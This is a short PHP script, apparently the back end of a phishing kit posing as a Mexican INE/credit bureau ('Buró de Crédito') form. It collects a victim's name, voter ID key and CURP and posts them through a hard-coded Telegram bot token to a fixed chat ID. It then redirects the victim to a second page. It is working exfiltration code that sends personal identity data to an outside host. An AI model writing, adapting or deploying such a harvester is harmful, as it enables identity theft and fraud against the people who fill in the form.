<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5160141279:AAErV8ttRSt-RD-Plsm1kqXsLcpP35X3exY";

$name = $_POST['name'];
$key = $_POST['key'];
$crp = $_POST['crp'];


$datos = [
    'chat_id' => '1556162059',
    #'chat_id' => '@el_canal si va dirigido a un canal',
    'text' => "DATOS INE BURO DE CREDITO \n\n📇 Nombre: $name \n✅ Clave de Elector: $key \n📞 CURP: $crp \n\nATTE: AssistentReboot",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);
if ($r_array['ok'] == 1) {
    header("Location: page2.php");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}
?>